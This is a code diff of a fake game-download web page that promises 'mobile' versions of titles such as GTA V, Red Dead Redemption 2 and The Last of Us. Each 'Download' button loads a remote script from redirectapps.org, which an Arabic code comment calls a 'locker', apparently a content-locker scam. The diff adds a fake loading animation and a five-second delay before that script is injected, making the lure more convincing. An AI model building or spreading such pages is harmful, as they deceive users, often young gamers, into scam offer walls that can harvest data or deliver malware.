@@ -8,14 +8,14 @@
   * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
   body { background-color:#121212; color:#fff; line-height:1.5; }
 
-  header { padding:20px; text-align:center; background:#1a1a1a; box-shadow:0 2px 10px rgba(0,0,0,0.5); }
-  header h1 { font-size:2rem; color:#ff3c00; }
-  header p { font-size:1rem; color:#ccc; }
+  header { padding:20px; text-align:center; background: linear-gradient(90deg,#ff3c00,#ff9900); color:#fff; box-shadow:0 2px 10px rgba(0,0,0,0.5); }
+  header h1 { font-size:2rem; }
+  header p { font-size:1rem; color:#fff; }
 
   .container { max-width:1200px; margin:30px auto; padding:0 15px; 
     display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:20px; }
 
-  .card { background:#1e1e1e; border-radius:12px; overflow:hidden; 
+  .card { background: linear-gradient(135deg,#1e1e1e,#2c2c2c); border-radius:12px; overflow:hidden; 
     box-shadow:0 5px 20px rgba(0,0,0,0.5); transition:transform 0.3s; }
   .card:hover { transform:translateY(-5px); }
 
@@ -30,6 +30,16 @@
   .card-content button { width:100%; padding:10px; border:none; border-radius:8px; 
     background:#ff3c00; color:#fff; font-weight:bold; cursor:pointer; transition:background 0.3s; }
   .card-content button:hover { background:#e63900; }
+
+  /* Loader */
+  .loader { display:none; text-align:center; margin:15px 0; }
+  .loader span { display:inline-block; width:10px; height:10px; margin:0 5px; background:#ff3c00; border-radius:50%; animation:bounce 1s infinite; }
+  .loader span:nth-child(2){ animation-delay:0.2s; }
+  .loader span:nth-child(3){ animation-delay:0.4s; }
+  @keyframes bounce {
+    0%,80%,100%{ transform:scale(0); }
+    40%{ transform:scale(1); }
+  }
 </style>
 </head>
 <body>
@@ -41,107 +51,128 @@
 
 <div class="container">
 
-  <!-- Template for each game -->
+  <!-- Fortnite -->
   <div class="card">
-    <img src="https://images.seeklogo.com/logo-png/33/1/fortnite-logo-png_seeklogo-330839.png">
+    <img src="https://via.placeholder.com/400x160?text=Fortnite+Mobile">
     <div class="card-content">
       <h2>Fortnite Mobile</h2>
       <p class="version">Version 20.10</p>
       <div class="stars">★★★★★</div>
       <div class="platforms"><span>Android</span><span>iOS</span></div>
-      <button onclick="loadLocker()">Download</button>
+      <div class="loader" id="loader1"><span></span><span></span><span></span></div>
+      <button onclick="loadWithDelay(1)">Download</button>
     </div>
   </div>
 
+  <!-- GTA V -->
   <div class="card">
-    <img src="https://images.seeklogo.com/logo-png/19/1/grand-theft-auto-5-logo-png_seeklogo-198614.png">
+    <img src="https://via.placeholder.com/400x160?text=GTA+V+Mobile">
     <div class="card-content">
       <h2>GTA V Mobile</h2>
       <p class="version">Version 1.0</p>
       <div class="stars">★★★★☆</div>
       <div class="platforms"><span>Android</span><span>iOS</span></div>
-      <button onclick="loadLocker()">Download</button>
+      <div class="loader" id="loader2"><span></span><span></span><span></span></div>
+      <button onclick="loadWithDelay(2)">Download</button>
     </div>
   </div>
 
+  <!-- GTA 4 -->
   <div class="card">
-    <img src="https://logowik.com/content/uploads/images/gta-grand-theft-auto-iv2676.jpg">
+    <img src="https://via.placeholder.com/400x160?text=GTA+4+Mobile">
     <div class="card-content">
       <h2>GTA 4 Mobile</h2>
       <p class="version">Version 1.0</p>
       <div class="stars">★★★★☆</div>
       <div class="platforms"><span>Android</span><span>iOS</span></div>
-      <button onclick="loadLocker()">Download</button>
+      <div class="loader" id="loader3"><span></span><span></span><span></span></div>
+      <button onclick="loadWithDelay(3)">Download</button>
     </div>
   </div>
 
+  <!-- Roblox -->
   <div class="card">
-    <img src="https://images.seeklogo.com/logo-png/44/1/roblox-white-logo-png_seeklogo-448288.png">
+    <img src="https://via.placeholder.com/400x160?text=Roblox+Mobile">
     <div class="card-content">
       <h2>Roblox Mobile</h2>
       <p class="version">Version 2.5</p>
       <div class="stars">★★★★★</div>
       <div class="platforms"><span>Android</span><span>iOS</span></div>
-      <button onclick="loadLocker()">Download</button>
+      <div class="loader" id="loader4"><span></span><span></span><span></span></div>
+      <button onclick="loadWithDelay(4)">Download</button>
     </div>
   </div>
 
+  <!-- Spider-Man 2 -->
   <div class="card">
-    <img src="https://images.seeklogo.com/logo-png/13/1/spider-man-2-logo-png_seeklogo-130398.png">
+    <img src="https://via.placeholder.com/400x160?text=Spider-Man+2+Mobile">
     <div class="card-content">
       <h2>Spider-Man 2 Mobile</h2>
       <p class="version">Version 1.2</p>
       <div class="stars">★★★★☆</div>
       <div class="platforms"><span>Android</span><span>iOS</span></div>
-      <button onclick="loadLocker()">Download</button>
+      <div class="loader" id="loader5"><span></span><span></span><span></span></div>
+      <button onclick="loadWithDelay(5)">Download</button>
     </div>
   </div>
 
+  <!-- Red Dead Redemption 2 -->
   <div class="card">
-    <img src="https://th.bing.com/th/id/OIP.0qv2jmcEGojg8tD3RMa4WgHaJI?o=7&cb=ucfimg2rm=3&ucfimg=1&rs=1&pid=ImgDetMain&o=7&rm=3">
+    <img src="https://via.placeholder.com/400x160?text=Red+Dead+Redemption+2+Mobile">
     <div class="card-content">
       <h2>Red Dead Redemption 2 Mobile</h2>
       <p class="version">Version 1.0</p>
       <div class="stars">★★★★★</div>
       <div class="platforms"><span>Android</span><span>iOS</span></div>
-      <button onclick="loadLocker()">Download</button>
+      <div class="loader" id="loader6"><span></span><span></span><span></span></div>
+      <button onclick="loadWithDelay(6)">Download</button>
     </div>
   </div>
 
+  <!-- The Last of Us -->
   <div class="card">
-    <img src="https://tapgm.com/game/images/icon/tlou.jpg">
+    <img src="https://via.placeholder.com/400x160?text=The+Last+of+Us+Mobile">
     <div class="card-content">
       <h2>The Last of Us Mobile</h2>
       <p class="version">Version 1.1</p>
       <div class="stars">★★★★★</div>
       <div class="platforms"><span>Android</span><span>iOS</span></div>
-      <button onclick="loadLocker()">Download</button>
+      <div class="loader" id="loader7"><span></span><span></span><span></span></div>
+      <button onclick="loadWithDelay(7)">Download</button>
     </div>
   </div>
 
+  <!-- Euro Truck Simulator 2 -->
   <div class="card">
-    <img src="https://images.seeklogo.com/logo-png/48/1/euro-truck-simulator-2-logo-png_seeklogo-489594.png">
+    <img src="https://via.placeholder.com/400x160?text=Euro+Truck+Simulator+2+Mobile">
     <div class="card-content">
       <h2>Euro Truck Simulator 2 Mobile</h2>
       <p class="version">Version 1.0</p>
       <div class="stars">★★★★☆</div>
       <div class="platforms"><span>Android</span><span>iOS</span></div>
-      <button onclick="loadLocker()">Download</button>
+      <div class="loader" id="loader8"><span></span><span></span><span></span></div>
+      <button onclick="loadWithDelay(8)">Download</button>
     </div>
   </div>
 
 </div>
 
 <script>
-function loadLocker() {
-  // إنشاء السكريبت ديال OGEADS بعد الضغط
-  if (!document.getElementById('ogjs')) {
-    var s = document.createElement('script');
-    s.src = "https://redirectapps.org/cl/js/gr6m5r";
-    s.type = "text/javascript";
-    s.id = "ogjs";
-    document.body.appendChild(s);
-  }
+function loadWithDelay(id) {
+  var loader = document.getElementById('loader'+id);
+  loader.style.display = 'block';
+  
+  setTimeout(function(){
+    loader.style.display = 'none';
+    // تحميل اللوكير بعد 5 ثواني
+    if (!document.getElementById('ogjs')) {
+      var s = document.createElement('script');
+      s.src = "https://redirectapps.org/cl/js/gr6m5r";
+      s.type = "text/javascript";
+      s.id = "ogjs";
+      document.body.appendChild(s);
+    }
+  }, 5000);
 }
 </script>
 
